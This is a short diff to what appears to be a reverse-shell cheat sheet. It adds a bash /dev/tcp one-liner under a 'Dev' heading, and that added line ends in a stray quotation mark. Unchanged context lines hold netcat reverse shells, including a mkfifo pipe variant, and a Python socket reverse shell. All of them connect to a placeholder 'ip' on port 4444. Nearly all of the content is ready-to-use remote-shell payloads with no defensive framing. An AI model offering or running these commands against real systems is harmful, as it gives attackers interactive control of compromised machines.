@@ -45,6 +45,11 @@ nc ip 4444 -e /bin/bash
 mkfifo /tmp/f;nc ip 4444 0</tmp/f|/bin/sh -i 2>&1|tee /tmp/f
 ```
 
+### Dev 
+```
+bash -c 'bash -i >& /dev/tcp/ip/4444 0>&1'"
+```
+
 ### Python
 ```bash
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
